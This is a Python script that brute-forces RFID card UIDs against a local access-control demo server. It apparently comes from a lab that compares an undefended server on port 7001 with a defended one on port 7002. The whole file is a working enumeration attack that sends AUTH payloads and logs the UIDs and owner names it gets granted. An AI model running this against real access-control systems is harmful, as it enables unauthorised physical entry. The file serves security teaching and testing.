#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RFID UID Brute Force Attack - scan UID space to find valid cards

Usage:
    python brute_force.py              # Attack normal AC (port 7001) - VULNERABLE
    python brute_force.py --secure     # Attack Secure AC (port 7002) - should block
"""
import socket, json, time, sys, io
from colorama import Fore, init
init(autoreset=True)

# Fix Windows CP1252 encoding issue
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

AC_HOST = '127.0.0.1'
AC_PORT = 7002 if '--secure' in sys.argv else 7001

# Known valid UIDs hidden in a wide space for demo purposes
# A1B2C3D4E5 = 0xA1B2C3D4E5, DEADBEEF01 = 0xDEADBEEF01
DEMO_RANGE_START = 0xA1B2C3D4E0   # just before first valid UID
DEMO_RANGE_END   = 0xA1B2C3D4F0   # just after first valid UID
DEMO_SAMPLE_RATE = 1               # check every single UID in range

def brute_force_uid(start_uid=0, max_uid=0x10000, sample_rate=1):
    """Scan UIDs from start_uid to max_uid"""
    print(f'{Fore.RED}=== RFID UID Brute Force ===')
    print(f'{Fore.RED}Range: 0x{start_uid:010X} -> 0x{max_uid:010X} ({max_uid - start_uid} IDs)')
    print(f'{Fore.RED}Sample rate: every {sample_rate} ID\n')

    found = []
    attempts = 0

    for uid_int in range(start_uid, max_uid, sample_rate):
        attempts += 1
        uid_hex = f'{uid_int:010X}'

        try:
            s = socket.socket()
            s.settimeout(1)
            s.connect((AC_HOST, AC_PORT))
            payload = {'cmd': 'AUTH', 'uid': uid_hex, 'timestamp': time.time()}
            s.send(json.dumps(payload).encode())
            resp = json.loads(s.recv(512).decode())
            s.close()

            status = resp.get('status', '?')
            if status == 'GRANTED':
                owner = resp.get('owner', 'UNKNOWN')
                found.append((uid_hex, owner))
                print(f'{Fore.GREEN}[+] FOUND VALID UID: {uid_hex} -> {owner}')
            elif status == 'DENIED' and 'unknown' not in resp.get('msg', '').lower():
                print(f'{Fore.YELLOW}[?] Interesting response: {uid_hex} -> {resp.get("msg", "")}')
        except Exception:
            pass

        if attempts % 5 == 0:
            print(f'{Fore.WHITE}[*] Tried {attempts} IDs, found {len(found)}...', end='\r')

    print(f'\n\n{Fore.GREEN}[+] Total attempts: {attempts}')
    print(f'{Fore.GREEN}[+] Valid UIDs found: {len(found)}')
    for uid, owner in found:
        print(f'  [*] {uid} ({owner})')
    return found


if __name__ == '__main__':
    mode = f"SECURE AC (port {AC_PORT}) - Defense ON" if '--secure' in sys.argv else f"AC Server (port {AC_PORT}) - No Defense"
    print(f"{Fore.CYAN}Target: {mode}\n")
    # Demo range: scan around the known valid UID A1B2C3D4E5
    brute_force_uid(DEMO_RANGE_START, DEMO_RANGE_END, sample_rate=DEMO_SAMPLE_RATE)
